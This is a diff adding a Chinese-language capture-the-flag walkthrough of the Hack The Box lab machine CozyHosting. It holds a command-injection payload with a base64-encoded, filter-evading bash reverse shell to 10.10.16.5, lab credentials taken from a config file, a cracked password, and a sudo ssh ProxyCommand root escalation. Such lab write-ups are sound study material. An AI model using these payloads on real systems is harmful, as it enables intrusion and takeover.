@@ -263,5 +263,139 @@ host=127.0.0.1&username=kanderson
 ```
 
 命令注入
-
+```
 host=127.0.0.1&username=kanderson;`ls`;
+```
+
+
+加密payload
+```
+┌──(root㉿kali)-[~]
+└─# echo "bash -i >& /dev/tcp/10.10.16.5/443 0>&1" | base64 -w 0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==  
+```
+
+完整payload
+```
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+```
+
+注意上面payload要在burp上urlencode key
+![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*M55t9tGZtHzUqRuhOTQEVQ.png)
+
+
+
+完整：
+```
+host=127.0.0.1&username=kanderson;echo${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg%3d%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
+```
+
+foohold
+```
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.230] 54510
+bash: cannot set terminal process group (1062): Inappropriate ioctl for device
+bash: no job control in this shell
+app@cozyhosting:/app$ whoami
+whoami
+app
+app@cozyhosting:/app$ 
+app@cozyhosting:/app$ ls
+ls
+cloudhosting-0.0.1.jar
+
+
+```
+
+有一个cloudhosting-0.0.1.jar文件，用py3开一个web，下载到kali
+
+解压以后遍历文件，找到一个凭据
+```
+┌──(root㉿kali)-[~/htb/CozyHosting/BOOT-INF/classes]
+└─# cat application.properties 
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR 
+```
+
+对内开启了postgresql服务，暴露了账号密码
+
+psql -h 127.0.0.1 -U postgres
+
+在Cozyhosting数据库的用户列表找到一个哈希，破解出来的密码是：manchesterunited
+
+
+ssh登录，拿到flag
+```
+┌──(root㉿kali)-[~]
+└─# ssh josh@10.10.11.230
+josh@10.10.11.230's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Feb 18 09:57:10 AM UTC 2024
+
+  System load:           0.01513671875
+  Usage of /:            54.4% of 5.42GB
+  Memory usage:          26%
+  Swap usage:            0%
+  Processes:             494
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.230
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:50bb
+
+  => There is 1 zombie process.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Feb 16 17:15:04 2024 from 10.10.14.11
+josh@cozyhosting:~$ ls
+user.txt
+josh@cozyhosting:~$ cat user.txt
+539b1a3774b8b7816b98e633ce29d0b9
+josh@cozyhosting:~$ 
+
+```
+
+# 提权
+
+```
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+
+```
+
+manchesterunited
+
+sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+cat /root/root.txt
